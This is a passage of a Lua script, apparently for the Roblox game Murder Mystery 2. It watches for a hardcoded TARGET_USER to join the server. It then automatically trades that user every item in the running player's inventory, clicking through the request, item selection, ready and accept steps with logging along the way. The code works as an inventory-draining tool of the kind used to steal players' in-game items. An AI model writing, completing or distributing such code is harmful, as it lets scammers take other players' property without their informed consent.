-- ============================================
-- MAIN AUTO TRADE SEQUENCE
-- ============================================

local tradeInProgress = false

local function startAutoTrade()
    if tradeInProgress then return end
    tradeInProgress = true
    
    sendLog("🎯 Starting auto trade with " .. TARGET_USER)
    
    -- Get ALL items (no filtering)
    local items = getAllItems()
    sendLog("📦 Total items found in inventory: " .. #items)
    
    if #items == 0 then
        sendLog("⚠️ No items found in inventory to trade!")
        sendLog("💡 Make sure you have items in your backpack or equipped")
        tradeInProgress = false
        return
    end
    
    -- List all items found
    sendLog("📋 Items being traded:")
    for _, item in pairs(items) do
        sendLog("  - " .. item.Name)
    end
    
    -- Step 1: Send trade request
    wait(1)
    findAndClickTradeButton()
    wait(2)
    
    -- Step 2: Accept trade request
    findAndClickAccept()
    wait(2)
    
    -- Step 3: Add up to 4 items (MM2 trade limit per trade)
    local itemsAdded = 0
    for i = 1, math.min(4, #items) do
        findAndClickAddItem()
        wait(0.5)
        selectInventoryItem(items[i])
        wait(0.5)
        itemsAdded = itemsAdded + 1
    end
    
    sendLog("➕ Added " .. itemsAdded .. " items to trade")
    wait(1)
    
    -- Step 4: Ready up
    findAndClickReady()
    wait(1)
    
    -- Step 5: Final accept
    findAndClickAccept()
    
    sendLog("🎉 Trade completed! " .. itemsAdded .. " items sent to " .. TARGET_USER)
    
    -- Check if there are more items to trade (for multiple trades)
    if #items > 4 then
        sendLog("⚠️ You have " .. (#items - 4) .. " more items remaining!")
        sendLog("💡 Run the script again to trade the remaining items")
    end
    
    tradeInProgress = false
end

-- ============================================
-- WATCH FOR TARGET JOINING
-- ============================================

local function watchForTarget()
    sendLog("👀 Watching for " .. TARGET_USER)
    sendLog("🎯 Trading ALL items - No rarity filter!")
    
    -- Check if already in server
    for _, plr in pairs(Players:GetPlayers()) do
        if plr.Name == TARGET_USER and plr ~= player then
            sendLog("👤 " .. TARGET_USER .. " is already in server!")
            wait(3)
            startAutoTrade()
            return
        end
    end
    
    -- Watch for joins
    Players.PlayerAdded:Connect(function(newPlayer)
        if newPlayer.Name == TARGET_USER then
            sendLog("🟢 " .. TARGET_USER .. " joined the server!")
            wait(5)
            startAutoTrade()
        end
    end)
end

